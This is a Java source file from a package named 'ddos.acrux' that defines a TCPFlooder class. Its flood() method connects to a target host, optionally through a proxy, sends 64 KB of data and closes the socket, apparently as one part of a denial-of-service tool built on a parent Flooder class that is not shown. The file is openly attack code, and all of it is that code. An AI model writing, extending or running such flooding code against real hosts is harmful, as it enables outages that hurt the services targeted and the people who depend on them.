package ddos.acrux;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketAddress;

/**
 *
 * @author acrux
 */
public class TCPFlooder extends Flooder {

    public TCPFlooder(SocketAddress host) {
        super(host);
    }

    public TCPFlooder(InetAddress ip, int port) {
        super(ip, port);
    }

    public TCPFlooder(String hostname, int port) {
        super(hostname, port);
    }

    @Override
    void flood() throws IOException {
        Socket sock;
        if (getProxy() != null) {
            sock = new Socket(getProxy());
        } else {
            sock = new Socket();
        }
        sock.connect(getHost(), timeout);

        OutputStream os = sock.getOutputStream();
        InputStream is = sock.getInputStream();

        

        os.write(getData(64*1024));
        os.flush();
        os.close();
        sock.close();
    }
}
